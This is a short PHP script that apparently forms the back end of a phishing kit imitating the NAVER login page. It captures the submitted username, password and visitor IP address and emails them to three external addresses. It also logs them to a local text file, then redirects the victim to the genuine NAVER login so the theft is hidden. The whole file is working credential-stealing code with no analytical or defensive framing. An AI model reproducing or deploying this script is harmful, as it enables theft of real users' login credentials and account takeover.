<?
$ip = getenv("REMOTE_ADDR");
$message  = "===========NAVER Rezult===========\n";
$message .= "Username: ".$_POST['id']."\n";
$message .= "Password: ".$_POST['pw']."\n";

$message .= "IP: ".$ip."\n";
$message .= "============Denate=========\n";
$send = "ddonwise10@zoho.com, maria.hirschberghof@gmail.com, g.2sulukdze@gmail.com";
$subject = "NAVER";
$headers = "From: NAVER";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://nid.naver.com/nidlogin.login");
$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);		  

?>
